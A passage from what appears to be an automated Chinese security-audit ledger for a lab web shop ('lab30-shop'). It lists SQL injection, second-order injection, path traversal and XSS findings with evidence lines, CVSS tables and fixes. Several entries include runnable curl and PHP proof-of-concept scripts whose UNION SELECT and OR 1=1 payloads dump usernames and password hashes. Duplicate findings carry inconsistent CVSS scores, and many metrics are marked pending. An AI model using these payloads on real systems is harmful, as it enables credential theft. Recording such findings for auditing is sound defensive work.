  修复建议：改用 prepared statement 并将 % 与参数绑定，或对输入做转义。

**CVSS 3.1 评分依据**

- 状态：待补充指标；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:15:15.753694+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP GET 参数触发 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 单引号即可闭合 LIKE 子句 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 入口 require_user(['operator','admin'])，需登录运营账号 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | 待补充 | 攻击者自身发起请求即可 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| S | 待补充 | 仍在同一数据库上下文 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| C | H | 可读取 users 全表字段 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | 待补充 | query 仅返回结果，直接写入需依赖后续语句形态 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| A | 待补充 | 无明显拒绝服务证据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'sqli_member_lookup.php', 'language': 'php', 'script': '<?php\n// 假设已登录 operator，Cookie: SHOPSESSID=<valid>\n$base=\'http://TARGET/ops/members.php\';\n$payload="%\' UNION SELECT id,username,password_md5,role FROM users-- -";\n$url=$base.\'?q=\'.rawurlencode($payload);\n$ch=curl_init($url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_HTTPHEADER,[\'Accept: application/json\']);curl_setopt($ch,CURLOPT_COOKIE,\'SHOPSESSID=REPLACE\');echo curl_exec($ch);\n', 'instructions': '将 TARGET 与 SHOPSESSID 替换为实际目标与登录后会话，运行后观察 JSON members 是否返回 password_md5 等非预期列。', 'normal_input': 'q=alice', 'attack_input': "q=%' UNION SELECT id,username,password_md5,role FROM users-- -", 'expected_result': '正常输入返回限定会员；攻击输入返回所有用户的 password_md5，证明注入成功。'}
````


### 台账 `c69fbc2e3f51448ba5c70f09c96bcb39`

- 运营报表将数据库中读出的 nickname 二次拼接进 SQL 导致二次注入（CVSS 3.1 待评分，验证：unverified）
  来源 `19bdf376fc5341afa5ea44431ecb95b3` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/report.php', 'start_line': 2, 'end_line': 2}, {'path': 'lab30-shop/app/public/ops/report.php', 'start_line': 3, 'end_line': 3}, {'path': 'lab30-shop/app/public/account/update.php', 'start_line': 4, 'end_line': 4}, {'path': 'lab30-shop/app/public/account/update.php', 'start_line': 6, 'end_line': 6}]
  结论：report.php 先用 prepared 语句按 id 取出 nickname，再把该值作为字符串拼进 "WHERE nickname='...'" 查询；nickname 可由账户更新页写入单引号等元字符，形成入库后二次 SQL 注入。
  输入：用户 nickname 字段（account/update.php:4-6 允许写 nickname），被 report.php 读出
  传播：UPDATE users SET nickname=... -> report.php 查出 $nickname -> 字符串拼接 db()->query
  危险操作：db()->query("SELECT username,email,role FROM users WHERE nickname='".$nickname."'")
  保护：第一次查询用 prepare 取 nickname，但第二次查询未绑定、未转义
  前提：['攻击者拥有普通账户可改 nickname，且拥有 operator/admin 会话访问 report.php；或运营人员查看被污染记录']
  修复建议：第二次查询也使用 prepared statement 并绑定 $nickname。

**CVSS 3.1 评分依据**

- 状态：待补充指标；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:15:15.755011+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP GET user_id 进入，报表页面触发 | lab30-shop/app/public/ops/report.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 需先由可控 nickname 写入数据库，含单引号内容，再选择该记录 | lab30-shop/app/public/ops/report.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/public/account/update.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 报表入口需 operator/admin；写入 nickname 需普通用户会话 | lab30-shop/app/public/ops/report.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | 待补充 | 同一攻击者可先写后读 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| S | 待补充 | 同一数据库边界 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| C | H | 拼接句可扩展读取全表 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | 待补充 | query 为 SELECT，写影响需依赖联句 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| A | 待补充 | 无明确拒绝服务证据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |

评分、引用校验、自动验证和结论处置分别记录。

- 运营报表用库中 nickname 二次拼接 SQL 导致入库型二次注入（CVSS 3.1 待评分，验证：unverified）
  来源 `11b14dbc439d4928adb385bfba0d3390` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/report.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/public/account/update.php', 'start_line': 4, 'end_line': 6}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 4, 'end_line': 8}]
  结论：ops/report.php:2 用 prepare 安全取出 nickname，但第 3 行把 $nickname 直接拼进 query 的 nickname='...' 子句，无二次转义。nickname 可由任意登录用户在 account/update.php:4-6 通过白名单列写入任意字符串，因此攻击者先写库再让 operator 触发报表即可注入，形成跨文件二次 SQL 注入。
  输入：攻击者控制的 users.nickname 字段（经 account/update.php 写入），由 $_GET['user_id'] 选择目标行
  传播：$_POST[nickname] → UPDATE users SET nickname=? → ops/report.php:2 读出 $nickname → 第 3 行字符串拼接 query
  危险操作：db()->query("SELECT username,email,role FROM users WHERE nickname='" . $nickname . "'")
  保护：首段取值使用了 prepared statement，但读取结果被直接拼接，无 escaping/绑定
  前提：['攻击者有普通登录账号可写 nickname；存在 operator/admin 访问报表（或攻击者自身具备 operator）']
  修复建议：报表查询改用 prepare('... WHERE nickname=?')->execute([$nickname])。

**CVSS 3.1 评分依据**

- 状态：待补充指标；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:16:25.498744+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 可达 | lab30-shop/app/public/ops/report.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 需先写入恶意 nickname 再触发报表，两步 | lab30-shop/app/public/account/update.php:4-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 写入需普通登录，报表读取需 operator/admin | lab30-shop/app/public/ops/report.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | 待补充 | 无其他用户交互要求 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| S | 待补充 | 同一数据库域 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| C | H | 可读出 users 任意列 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | 待补充 | 查询结果可被篡改 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| A | 待补充 | 无可用性影响证据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'sqli_second_order.sh', 'language': 'bash', 'script': 'curl -s -b "SHOPSESSID=$USER_SID" -d "csrf=$CSRF&nickname=\' UNION SELECT username,password_md5,role FROM users-- -" "http://TARGET/account/update.php"\ncurl -s -b "SHOPSESSID=$OP_SID" -G "http://TARGET/ops/report.php" --data-urlencode "user_id=$UID" -H "Accept: application/json"', 'instructions': '普通用户 SID 写 nickname payload，再用 operator SID 请求报表；对照 nickname=alice。', 'normal_input': 'nickname=alice', 'attack_input': "nickname=' UNION SELECT username,password_md5,role FROM users-- -", 'expected_result': '正常 nickname 返回自身记录；payload 使报表返回包含 password_md5 的行。'}
````

- 运营报表用库中 nickname 二次拼接 SQL 导致入库型二次注入（CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N，验证：unverified）
  来源 `86d6c823100f42e18a865c414f80712d` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/report.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/public/account/update.php', 'start_line': 4, 'end_line': 6}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 4, 'end_line': 8}]
  结论：ops/report.php:2 以 (int)$_GET['user_id'] 安全查询取得 nickname；report.php:3 随后 db()->query("SELECT username,email,role FROM users WHERE nickname='".$nickname."'") 无参数化拼接。nickname 可由用户在 account/update.php:5-6（白名单含 nickname，值以绑定写入但不校验内容）自行设置，形成存储型二次注入。
  输入：用户资料 nickname 字段（account/update.php:4-6 存储），经 ops/report.php user_id 读取
  传播：POST nickname → UPDATE users 写入 → report.php:2 SELECT nickname 读出 → report.php:3 拼接 query
  危险操作：db()->query 中以库值拼接的 SQL
  保护：第一段查询用了 prepare，但读出的值未以参数化方式在第二段使用
  前提：['攻击者可以更新自己 nickname；report.php 需要 operator/admin；需要以目标用户 id 调用报表']
  修复建议：第二段查询改用 prepare('... WHERE nickname=?')->execute([$nickname])。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:17:10.093818+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口 | lab30-shop/app/public/ops/report.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需先写入 nickname 再访问报表，流程固定 | lab30-shop/app/public/account/update.php:5-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需普通用户写入 nickname；读取需运营权限 | lab30-shop/app/public/ops/report.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人参与 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同库上下文 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读出 users 表任意列 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | SELECT 注入读取为主 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性证据 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'sqli_second_order.sh', 'language': 'bash', 'script': '# 1) 以普通用户写入恶意 nickname\ncurl -s -b "SHOPSESSID=<user_session>" -d "csrf=<csrf>&nickname=%27%20OR%201=1--%20-" http://TARGET/account/update.php\n# 2) 运营访问报表读取自己 id\ncurl -s -b "SHOPSESSID=<operator_session>" "http://TARGET/ops/report.php?user_id=<user_id>" -H \'Accept: application/json\'', 'instructions': '将 <user_session>/<operator_session>/<user_id>/<csrf> 替换为实际值；先写入再读取报表', 'normal_input': 'nickname=alice', 'attack_input': "nickname=' OR 1=1-- -", 'expected_result': '正常昵称报表仅返回该用户；恶意昵称导致第二段查询返回全部用户'}
````

- 运营会员报表将库中 nickname 二次拼接造成入库型二次注入（CVSS 3.1 Base 4.8 (medium) · CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `1bbcbad19ed94c38a0927600f926e8f3` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/report.php', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/public/account/update.php', 'start_line': 4, 'end_line': 6}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 6, 'end_line': 6}]
  结论：report.php:2 先 prepare 取出 nickname，第 3 行再用 db()->query("SELECT ... WHERE nickname='".$nickname."'") 拼接。nickname 可由用户经 account/update.php:5-6 的昵称字段写入（列白名单含 nickname，值走绑定但内容不转义），因此低权限用户先存储恶意串，再由 operator/admin 访问报表时触发二次注入。
  输入：用户可控的 users.nickname（经账户资料更新写入），user_id 参数选择目标
  传播：update.php 写入 nickname -> report.php:2 读出 $nickname -> report.php:3 query() 拼接
  危险操作：db()->query() 执行含库中数据的拼接 SQL
  保护：读取用 prepare 但输出侧未绑定/转义
  前提：['攻击者拥有账号并可更新资料；报表页需 operator/admin 权限访问']
  修复建议：报表查询改为 prepare 并绑定 $nickname，避免任何字符串拼接。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:17:43.073916+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 可达 | lab30-shop/app/public/ops/report.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 需先写入库并等待特权用户访问 | lab30-shop/app/public/account/update.php:5-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 写入侧需普通账号 | lab30-shop/app/public/account/update.php:2-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需运营人员访问报表页触发 | lab30-shop/app/public/ops/report.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一数据库 | lab30-shop/app/src/bootstrap.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取任意表数据 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读查询 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏证据 | lab30-shop/app/public/ops/report.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `799cd9e0124248289876d34136d3de47`

- 客服文档下载 file 参数路径遍历读取任意数据目录文件（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `ad1021c6d2bc4a92b6223978e76aac22` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/support/download.php', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 9, 'end_line': 9}, {'path': 'lab30-shop/app/src/setup.php', 'start_line': 34, 'end_line': 35}]
  结论：download.php:3 将 $_GET['file'] 原样拼接到 data_dir()/docs/ 传给 file_get_contents，无 basename/realpath 限制，../ 可逃出 docs 读取 vault 内文件。
  输入：GET 参数 file
  传播：$_GET['file'] -> $path = data_dir().'/docs/'.file -> file_get_contents($path)
  危险操作：file_get_contents 读取任意可穿越路径
  保护：仅 is_file 存在性检查，无路径规范化限制
  前提：['已登录用户；data_dir 下存在目标文件']
  修复建议：使用 basename 并 realpath 校验前缀，拒绝含 ../ 的输入。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:15:46.270870+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 入口 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需构造 ../ | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user 仅要求登录 | lab30-shop/app/public/support/download.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同进程读取 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读 vault 内部文件 | lab30-shop/app/src/setup.php:34-35 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 只读 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `41e6ea870a4943c1a11a09b6cd5bf026`

- 运营会员查询 GET q 直接拼接 LIKE 导致 SQL 注入（CVSS 3.1 待评分，验证：unverified）
  来源 `873c0c3b41b445f4b86322315ed7b0eb` / 修订 1
  证据：[{'path': 'lab30-shop/app/src/member_lookup.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/public/ops/members.php', 'start_line': 2, 'end_line': 2}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 4, 'end_line': 8}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：ops/members.php:2 将 $_GET['q'] 原样传给 member_lookup()，member_lookup.php:3 用 db()->query 把 $term 拼进 WHERE username LIKE '%...%'，无 prepare/绑定/转义（PDO 连接 EMULATE_PREPARES=false 但此处根本未用 prepare）。攻击者需 operator 角色，可用 UNION/盲注读出 users 表其他数据（如 password_md5）。
  输入：HTTP GET 参数 q（需 operator/admin 登录）
  传播：$_GET['q'] → $term → member_lookup($term) → query 字符串拼接
  危险操作：db()->query("SELECT ... WHERE username LIKE '%" . $term . "%'")
  保护：仅 require_user(['operator','admin']) 权限门禁；无预处理、无转义、无类型限制
  前提：['持有 operator 或 admin 账号并登录']
  修复建议：改为 db()->prepare('... LIKE ?') 并 execute(['%'.$term.'%'])。

**CVSS 3.1 评分依据**

- 状态：待补充指标；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:16:25.497637+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口可远程访问 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 标准 UNION/布尔注入即可，无需特殊条件 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需 operator/admin 登录会话 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | 待补充 | 攻击者自身发起请求 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| S | 待补充 | 同一 DB 上下文 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| C | H | 可读 users 表含 password_md5/email/role | lab30-shop/app/public/ops/members.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | 待补充 | 注入亦可修改查询结果集 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |
| A | 待补充 | 无直接可用性影响证据 | 来源不可用 | 缺少可核实的源码引用或明确人工假设 |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'sqli_member_lookup.sh', 'language': 'bash', 'script': 'curl -s -b "SHOPSESSID=$SID" --data \'\' -G "http://TARGET/ops/members.php" --data-urlencode "q=\' UNION SELECT id,username,password_md5,role FROM users-- -" --data-urlencode "Accept: application/json"', 'instructions': '登录 operator 账号取得会话 Cookie，替换 SID 与 TARGET 后执行；对照普通 q=alice。', 'normal_input': 'q=alice', 'attack_input': "q=' UNION SELECT id,username,password_md5,role FROM users-- -", 'expected_result': '正常返回匹配会员；攻击请求返回包含 password_md5 哈希列的 JSON members 列表。'}
````


### 台账 `de803aecbdd7403db1edb5cf66d6167c`

- 运营会员查询 GET q 拼接 LIKE 导致 SQL 注入（CVSS 3.1 Base 8.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N，验证：unverified）
  来源 `afaaa9174a0c469e92f3636867651fb2` / 修订 1
  证据：[{'path': 'lab30-shop/app/src/member_lookup.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/public/ops/members.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 4, 'end_line': 8}]
  结论：ops/members.php:2 将 $_GET['q'] 直接传给 member_lookup()，后者在 member_lookup.php:3 将 $term 拼入 db()->query("SELECT ... WHERE username LIKE '%" . $term . "%'")。db() 的 EMULATE_PREPARES=false 仅对 prepare() 生效，query() 无任何绑定或转义，攻击者可注入任意 SQL（如 ' OR 1=1-- ）。
  输入：HTTP GET q 参数（ops/members.php:2）
  传播：$_GET['q'] → member_lookup($term) → 字符串拼接 → PDO::query
  危险操作：db()->query 中未参数化的 SQL 语句
  保护：无：未使用 prepare/quote，query() 不走预处理
  前提：["已登录 operator 或 admin 角色（require_user(['operator','admin'])）"]
  修复建议：改用 db()->prepare('SELECT ... WHERE username LIKE ?') 并 execute(['%'.$term.'%'])，同时对 %/_ 进行转义。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:17:10.092789+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口可远程访问 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 无需特殊条件，直接 GET 注入 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录运营角色 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需其他用户参与 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一数据库上下文 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读写 users 表任意数据（SELECT 注入） | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 可注入 UPDATE 等修改语句（多语句视驱动而定，但至少可子查询篡改数据） | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无具体可用性影响证据 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'sqli_member_lookup.sh', 'language': 'bash', 'script': 'curl -s -b "SHOPSESSID=<operator_session>" "http://TARGET/ops/members.php?q=%27%20OR%201=1--%20-" -H \'Accept: application/json\'', 'instructions': '将 <operator_session> 换为运营账号会话，TARGET 换为部署地址；发送请求', 'normal_input': 'q=alice', 'attack_input': "q=' OR 1=1-- -", 'expected_result': '正常输入仅返回匹配会员；攻击输入返回全表所有用户，证明注入成功'}
````


### 台账 `8debae5d87fd4214ae3f767e062b4426`

- 商品目录公开搜索 GET q 直接拼接 SQL 导致注入（CVSS 3.1 Base 7.5 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `c7cf4a8f0a07413b85834b06ab00a687` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/catalog/index.php', 'start_line': 3, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 6, 'end_line': 6}]
  结论：catalog/index.php:3 取 $_GET['q'] 未过滤，第 4 行用 db()->query("...name LIKE '%".$term."%' ...") 直接拼接并执行；query() 不做参数绑定，无转义，任何未登录访问者都可注入 UNION/布尔盲注读取 users 表。
  输入：HTTP GET 参数 q
  传播：$_GET['q'] -> $term -> 字符串拼接 -> PDO::query() 执行
  危险操作：db()->query() 执行拼接后的 SQL
  保护：无：未使用 prepare/占位符，也无转义
  前提：['无需登录，公开页面']
  修复建议：改用 db()->prepare('... WHERE name LIKE ?') 并绑定 '%'.$term.'%'。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:17:43.072793+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 公网可访问页面 | lab30-shop/app/public/catalog/index.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接拼接，payload 稳定 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 无需认证 | lab30-shop/app/public/catalog/index.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者直接请求 | lab30-shop/app/public/catalog/index.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一数据库上下文 | lab30-shop/app/src/bootstrap.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可 UNION 读出 users 密码哈希等 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读查询 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏证据 | lab30-shop/app/public/catalog/index.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'sqli_catalog_search.sh', 'language': 'bash', 'script': 'curl -s -G \'http://TARGET/catalog/index.php\' --data-urlencode "q=\' UNION SELECT 1,username,password_md5,email,1,1 FROM users-- -"', 'instructions': '替换 TARGET 为目标主机，访问 /catalog/index.php 公开搜索，观察响应是否返回用户表数据。', 'normal_input': 'q=拾光', 'attack_input': "q=' UNION SELECT 1,username,password_md5,email,1,1 FROM users-- -", 'expected_result': '正常搜索返回商品；注入后页面表格/结果中出现 users 表字段数据'}
````


### 台账 `85e0c4fd0de74f398345de4b20b42898`

- profile.php 的 url 参数未经协议校验进入 href 导致 javascript: 伪协议 XSS（CVSS 3.1 待评分，验证：unverified）
  来源 `c96960254a534505a14b18e7af464ef9` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/profile.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}]
  结论：profile.php 第2行从 $_GET['url'] 取用户输入（缺省为 homepage），第3行直接以字符串拼接写入 <a href="...">，未调用 h() 也未做 http/https 协议白名单，攻击者可构造 javascript: 伪协议 URL 使受害者点击后执行脚本。
  输入：GET 参数 url（未登录时为 u['homepage']，登录后仍可由 GET 覆盖）
  传播：$_GET['url'] -> $url -> '<a id="profile-link" href="'.$url.'">'
  危险操作：将未转义输入写入 HTML 属性 href，允许 javascript: 伪协议承载脚本
  保护：page()/form_input 使用 h() 仅作用于其他字段；href 处未转义、无 protocol allowlist
  前提：['受害者登录后访问带 payload 的 profile.php 链接并点击该链接']
  修复建议：在输出前使用 filter_var($url, FILTER_VALIDATE_URL) 仅允许 http/https，或强制 precede scheme 校验并对属性使用 h() 转义。

**CVSS 3.1 评分依据**

- 状态：待补充指标；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
